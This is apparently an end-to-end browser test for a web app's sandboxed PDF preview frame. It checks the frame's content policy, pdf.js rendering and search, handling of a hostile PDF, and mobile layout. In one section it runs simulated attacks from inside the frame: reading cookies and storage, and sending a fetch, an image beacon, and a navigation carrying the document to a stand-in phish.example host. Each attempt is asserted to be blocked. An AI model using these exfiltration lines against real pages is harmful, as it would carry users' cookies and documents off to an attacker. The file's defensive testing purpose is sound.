// Copyright 2026- Seongwoo Hong. All rights reserved.

/**
 * e2e:preview — files opened in the sandboxed preview frame (commit 42a,
 * docs/PREVIEWS.md), in Chromium, and the frame ATTACKED from inside.
 *
 * What it proves:
 *   - the frame's page carries its own policy, replacing the app's;
 *   - a PDF opens in a frame with sandbox="allow-scripts", drawn by pdf.js:
 *     every page counted, its text selectable and searchable — Korean in a
 *     non-embedded font included (pdf.js needs a CMap, which only the app
 *     can fetch for it) — and its facts shown outside the frame;
 *   - a hostile PDF's JavaScript never runs (no dialog, no request to the
 *     address it would submit to), its link is listed but not followed,
 *     its embedded file named but not opened;
 *   - from INSIDE the frame, as a reader exploited by a file would be:
 *     no cookie, no storage, no reach into the app, no request to the API
 *     or the network, no popup, no top navigation — and navigating the
 *     frame itself away is refused by the app's frame-src and closes it;
 *   - Escape inside the frame closes the viewer; the frame made exactly
 *     one request of its own: its page;
 *   - on a phone the reader fits the screen, and a swipe inside the frame
 *     opens the next file, as it does over a picture.
 */

import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { startDev } from "../api/_dev.mjs";
import { seedLead } from "../lib/seed-lead.mjs";

let chromium = null;
try {
	chromium = (await import("playwright")).chromium;
} catch {
	// not installed — a skip, not a failure
}
if (!chromium) {
	console.log("skip  e2e:preview — install it with: npm i -D playwright");
	process.exit(0);
}

const fixture = (name) => readFileSync(new URL(`../fixtures/preview/${name}`, import.meta.url));

const dev = await startDev({ persist: "e2e-preview" });
try {
	const { recoveryCode } = await seedLead(dev.base, { id: "rin", name: "Rin", email: "rin@preview.test" });

	// ── the frame's page: its own policy, not the app's ─────────────────
	const pageRes = await fetch(`${dev.base}/preview.html`, { headers: { "x-gorani-dev-email": "rin@preview.test" }, redirect: "follow" });
	assert.equal(pageRes.status, 200);
	const frameCsp = pageRes.headers.get("content-security-policy") ?? "";
	assert.match(frameCsp, /^default-src 'none'; script-src 'sha256-[A-Za-z0-9+/=]+' blob: 'wasm-unsafe-eval';/, "the frame's own policy");
	assert.doesNotMatch(frameCsp, /script-src 'self'/, "…and not the app's merged into it (the ! lines detach it)");
	assert.match(frameCsp, /connect-src blob: data:;/);
	assert.equal(pageRes.headers.get("x-frame-options"), "SAMEORIGIN");
	const appCsp = (await fetch(`${dev.base}/`, { headers: { "x-gorani-dev-email": "rin@preview.test" } })).headers.get("content-security-policy") ?? "";
	assert.match(appCsp, /frame-src 'self'/);

	const browser = await chromium.launch({ headless: true });
	const ctx = await browser.newContext({ acceptDownloads: true });
	// (Init scripts run in every frame; the sandboxed one has no storage.)
	await ctx.addInitScript(() => self.origin !== "null" && localStorage.setItem("gorani-dev-email", "rin@preview.test"));
	const page = await ctx.newPage();
	const errors = [];
	page.on("pageerror", (e) => errors.push(String(e)));
	const consoleCsp = [];
	page.on("console", (m) => {
		if (/Content Security Policy|Refused to|Trusted Type/i.test(m.text())) consoleCsp.push(m.text());
	});
	const dialogs = [];
	page.on("dialog", (d) => {
		dialogs.push(d.message());
		void d.dismiss();
	});
	// What actually LEFT for the network: every off-site request the browser
	// really sends reaches this route (answered here, never the internet). A
	// request the CSP blocks never does — DevTools still lists those, marked
	// "(blocked:csp)", so the page's request events alone cannot tell.
	const offSite = [];
	await ctx.route((url) => !url.href.startsWith(dev.base), (route) => {
		offSite.push(route.request().url());
		return route.fulfill({ status: 204 });
	});
	const fromFrame = [];
	const blockedByCsp = [];
	page.on("request", (r) => {
		if (r.frame() !== page.mainFrame() && r.url().startsWith(dev.base)) fromFrame.push(new URL(r.url()).pathname);
	});
	page.on("requestfailed", (r) => {
		if (!r.url().startsWith(dev.base)) blockedByCsp.push(`${r.url()} ${r.failure()?.errorText}`);
	});

	await page.goto(dev.base);
	await page.getByPlaceholder(/Recovery code/).fill(recoveryCode);
	await page.getByRole("button", { name: "Unlock" }).click();
	await page.locator("gorani-win11 [data-upload]").first().waitFor({ state: "attached", timeout: 30_000 });
	await page.locator("gorani-win11 [data-upload]").first().setInputFiles([
		{ name: "report.pdf", mimeType: "application/pdf", buffer: fixture("report.pdf") },
		{ name: "hostile.pdf", mimeType: "application/pdf", buffer: fixture("hostile.pdf") },
	]);
	const row = (name) => page.locator('[data-body] [data-item^="file:"]', { hasText: name }).first();
	await row("hostile.pdf").waitFor({ timeout: 60_000 });

	// ── a PDF, drawn in the frame ──────────────────────────────────────
	await row("report.pdf").dblclick();
	const iframe = page.locator('iframe[data-preview="pdf"]');
	await iframe.waitFor({ timeout: 30_000 });
	assert.equal(await iframe.getAttribute("sandbox"), "allow-scripts", "scripts, and nothing else");
	const f = page.frameLocator('iframe[data-preview="pdf"]');
	await f.locator('[data-test="pdf-page"]', { hasText: "/ 3" }).waitFor({ timeout: 30_000 });
	await f.getByText("Gorani PDF page one").waitFor({ timeout: 30_000 });
	// Page two, drawn when it comes near the view: Korean, from a CMap the app fetched for the frame.
	await f.getByRole("button", { name: "Next page" }).click();
	await f.locator('[data-test="pdf-page"]', { hasText: "2 / 3" }).waitFor({ timeout: 30_000 });
	await f.getByText(/고라니/).first().waitFor({ timeout: 30_000 });
	const facts = page.locator('[data-test="viewer-facts"]');
	await facts.getByText(/3 pages/).waitFor({ timeout: 30_000 });
	assert.match(await facts.innerText(), /title Quarterly report · author Gorani tests/, "the PDF's own metadata, shown outside the frame");
	await f.locator('[data-test="pdf-search"]').fill("page three");
	await f.locator('[data-test="pdf-search"]').press("Enter");
	await f.locator('[data-test="pdf-found"]', { hasText: "Page 3 · 1 of 1 pages" }).waitFor({ timeout: 30_000 });
	await f.locator('[data-test="pdf-fit"]').click();
	assert.deepEqual(consoleCsp, [], "pdf.js ran under the frame's policy with nothing blocked");
	assert.deepEqual(errors, [], "no page error");
	// Escape from inside the frame closes the viewer (the frame hands the key out).
	await f.getByText("Gorani PDF page one").click();
	await page.keyboard.press("Escape");
	await iframe.waitFor({ state: "detached", timeout: 10_000 });

	// ── a hostile PDF: nothing in it runs, everything in it is said ────
	await row("hostile.pdf").dblclick();
	await page.frameLocator('iframe[data-preview="pdf"]').getByText("Invoice overdue").waitFor({ timeout: 30_000 });
	await facts.getByText(/JavaScript/).waitFor({ timeout: 30_000 });
	const said = await facts.innerText();
	assert.match(said, /Contains JavaScript or automatic actions — none of it was run/);
	assert.match(said, /Embeds 1 file: payload\.txt — not opened/);
	assert.match(said, /Links to 1 address \(not followed\): https:\/\/phish\.example\/login/);
	await page.waitForTimeout(500);
	assert.deepEqual(dialogs, [], "the PDF's alert() never ran");
	assert.deepEqual(offSite, [], "nothing was sent to the address its OpenAction submits to");

	// ── attacking the frame from inside, as an exploited reader would ──
	const frame = page.frames().find((x) => x.url().includes("/preview"));
	assert.ok(frame, "the preview frame is there");
	const inside = await frame.evaluate(async () => {
		const tryIt = (f) => {
			try {
				return f();
			} catch (e) {
				return `denied (${e?.name ?? "error"})`;
			}
		};
		const reach = (u) => fetch(u).then(() => "reached", () => "blocked");
		return {
			origin: self.origin,
			cookie: tryIt(() => `readable: ${document.cookie}`),
			storage: tryIt(() => `readable: ${localStorage.length}`),
			idb: await new Promise((ok) => {
				try {
					const r = indexedDB.open("gorani");
					r.onsuccess = () => ok("opened");
					r.onerror = () => ok("denied");
				} catch (e) {
					ok(`denied (${e?.name})`);
				}
			}),
			parentDom: tryIt(() => `readable: ${parent.document.title}`),
			api: await reach("/api/v1/family"),
			network: await reach("https://phish.example/collect"),
			popup: tryIt(() => (window.open("https://phish.example/") ? "opened" : "blocked")),
			top: tryIt(() => {
				top.location.href = "https://phish.example/";
				return "navigated";
			}),
			beacon: tryIt(() => {
				new Image().src = "https://phish.example/beacon.png";
				return "tried";
			}),
		};
	});
	assert.equal(inside.origin, "null", "an opaque origin");
	assert.match(inside.cookie, /^denied/, "no cookies");
	assert.match(inside.storage, /^denied/, "no localStorage");
	assert.notEqual(inside.idb, "opened", "no IndexedDB");
	assert.match(inside.parentDom, /^denied/, "no reach into the app's page");
	assert.equal(inside.api, "blocked", "the API is out of reach");
	assert.equal(inside.network, "blocked", "so is everywhere else");
	assert.equal(inside.popup, "blocked", "no windows");
	assert.match(inside.top, /^denied/, "no top-level navigation");
	await page.waitForTimeout(500);
	assert.deepEqual(offSite, [], "no beacon, no request of any kind left the frame");
	assert.ok(blockedByCsp.some((b) => b.startsWith("https://phish.example/beacon.png")), `the beacon was stopped by the frame's CSP: ${JSON.stringify(blockedByCsp)}`);
	// Navigating the frame itself away (to carry the file out in the URL):
	// the app's frame-src refuses it, and the frame is closed.
	await frame.evaluate(() => {
		location.href = "https://phish.example/steal?doc=invoice";
	});
	await page.getByText("The preview tried to leave its frame and was closed").waitFor({ timeout: 10_000 });
	assert.equal(await page.locator("iframe[data-preview]").count(), 0, "the frame is gone");
	assert.deepEqual(offSite, [], "the navigation never left");
	assert.deepEqual([...new Set(fromFrame)].filter((p) => !/^\/preview(\.html)?$/.test(p)), [], `the frame's only requests were its own page: ${JSON.stringify(fromFrame)}`);
	await page.keyboard.press("Escape");

	await ctx.close();

	// ── on a phone: the reader fits, and a swipe in the frame moves on ──
	{
		const { devices } = await import("playwright");
		const phone = await browser.newContext({ ...devices["Pixel 7"] });
		await phone.addInitScript(() => self.origin !== "null" && localStorage.setItem("gorani-dev-email", "rin@preview.test"));
		const p = await phone.newPage();
		await p.goto(dev.base);
		await p.getByPlaceholder(/Recovery code/).fill(recoveryCode);
		await p.getByRole("button", { name: "Unlock" }).tap();
		const phoneRow = (name) => p.locator('[data-test="phone-row"]', { has: p.locator(`[data-name]:text-is("${name}")`) });
		await phoneRow("hostile.pdf").locator("button").first().tap();
		const pf = p.frameLocator('iframe[data-preview="pdf"]');
		await pf.getByText("Invoice overdue").waitFor({ timeout: 30_000 });
		const { scroll, width } = await p.evaluate(() => ({ scroll: document.documentElement.scrollWidth, width: innerWidth }));
		assert.ok(scroll <= width, `the PDF fits the phone (${scroll} in ${width})`);
		assert.equal(await pf.locator('[data-test="pdf-thumbs"]').getAttribute("aria-pressed"), "false", "the page list starts closed on a phone");
		// A finger travelling left across the page, inside the frame.
		const box = await p.locator('iframe[data-preview="pdf"]').boundingBox();
		const cdp = await phone.newCDPSession(p);
		const y = box.y + box.height / 2;
		await cdp.send("Input.dispatchTouchEvent", { type: "touchStart", touchPoints: [{ x: box.x + box.width * 0.8, y }] });
		for (let i = 1; i <= 8; i++) await cdp.send("Input.dispatchTouchEvent", { type: "touchMove", touchPoints: [{ x: box.x + box.width * (0.8 - 0.07 * i), y: y + i }] });
		await cdp.send("Input.dispatchTouchEvent", { type: "touchEnd", touchPoints: [] });
		await p.frameLocator('iframe[data-preview="pdf"]').getByText("Gorani PDF page one").waitFor({ timeout: 30_000 });
		await p.locator('[data-test="viewer-position"]', { hasText: "2 / 2" }).waitFor();
		await phone.close();
	}
	await browser.close();
	console.log("ok  e2e:preview — the frame's own policy; a PDF drawn by pdf.js in an allow-scripts-only frame (pages, text, Korean through a CMap, search, facts), a hostile PDF's script never run and its link and attachment named; from inside the frame no cookie, storage, parent, API, network, popup or top navigation, and a frame that navigates is refused and closed; on a phone it fits and a swipe in the frame opens the next file");
} finally {
	await dev.close();
}
